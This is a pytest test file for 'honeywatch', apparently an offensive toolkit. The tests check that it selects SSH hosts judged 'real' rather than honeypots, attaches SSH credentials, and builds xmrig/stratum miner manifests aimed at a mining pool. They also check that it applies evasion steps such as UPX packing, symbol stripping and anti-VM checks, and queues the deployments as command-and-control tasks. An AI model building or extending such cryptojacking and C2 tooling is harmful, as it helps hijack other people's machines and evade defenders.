"""Tests for honeywatch.ops targeting and deployment."""

from __future__ import annotations

import pytest

from honeywatch.c2.store import C2Store
from honeywatch.models import Fingerprint, Score, Signals, Target
from honeywatch.ops import (
    TargetFilter,
    build_manifest,
    enqueue_operation,
    prepare_evasion_pipeline,
    select_targets,
)
from honeywatch.store import Store


def _make_score(ip, label, confidence, flags=None):
    return Score(
        ip=ip,
        port=22,
        fingerprint=Fingerprint(ip=ip, port=22, banner="SSH-2.0-OpenSSH_9.0"),
        signals=Signals(flags=flags or [], heuristic_score=confidence),
        final_label=label,
        final_confidence=confidence,
    )


@pytest.fixture
def populated_store(tmp_path):
    db = tmp_path / "ops.db"
    store = Store(str(db))
    scores = [
        _make_score("10.0.0.1", "real", 0.95),
        _make_score("10.0.0.2", "real", 0.88),
        _make_score("10.0.0.3", "honeypot", 0.92),
    ]
    store.upsert_scores(scores)
    return store


def test_select_targets_by_label_and_confidence(populated_store):
    filter_ = TargetFilter(labels={"real"}, min_confidence=0.9, limit=10)
    targets = select_targets(populated_store, filter_)
    assert len(targets) == 1
    assert targets[0].ip == "10.0.0.1"


def test_select_targets_respects_limit(populated_store):
    filter_ = TargetFilter(labels={"real"}, limit=1)
    targets = select_targets(populated_store, filter_)
    assert len(targets) == 1


def test_select_targets_propagates_ssh_credentials(populated_store):
    filter_ = TargetFilter(labels={"real"}, limit=1)
    targets = select_targets(populated_store, filter_, ssh_user="admin", ssh_key="/k")
    assert targets[0].ssh_user == "admin"
    assert targets[0].ssh_key == "/k"


def test_build_manifest_requires_variables():
    with pytest.raises(ValueError):
        build_manifest("xmrig", [Target(ip="10.0.0.1", port=22)], {})


def test_build_manifest_renders_scripts():
    targets = [Target(ip="10.0.0.1", port=22)]
    manifest = build_manifest(
        "stratum",
        targets,
        {"upstream_pool": "pool.example.com:3333"},
    )
    assert manifest.payload.id == "stratum"
    assert "10.0.0.1" in manifest.per_host_scripts
    assert "pool.example.com:3333" in manifest.per_host_scripts["10.0.0.1"]


def test_prepare_evasion_pipeline_filters_evasion_only():
    assert prepare_evasion_pipeline("upx,symbol_strip,xmrig") == ["upx", "symbol_strip"]
    assert prepare_evasion_pipeline(["anti_vm", "metasploit"]) == ["anti_vm"]


def test_enqueue_operation_creates_tasks(tmp_path):
    db = tmp_path / "c2.db"
    c2_store = C2Store(str(db))
    targets = [Target(ip="10.0.0.1", port=22)]
    manifest = build_manifest(
        "stratum",
        targets,
        {"upstream_pool": "pool.example.com:3333"},
    )
    op = enqueue_operation(c2_store, manifest)
    assert op.status == "running"
    tasks = c2_store.list_tasks(operation_id=op.id)
    assert len(tasks) == 1
    assert tasks[0].payload_id == "stratum"
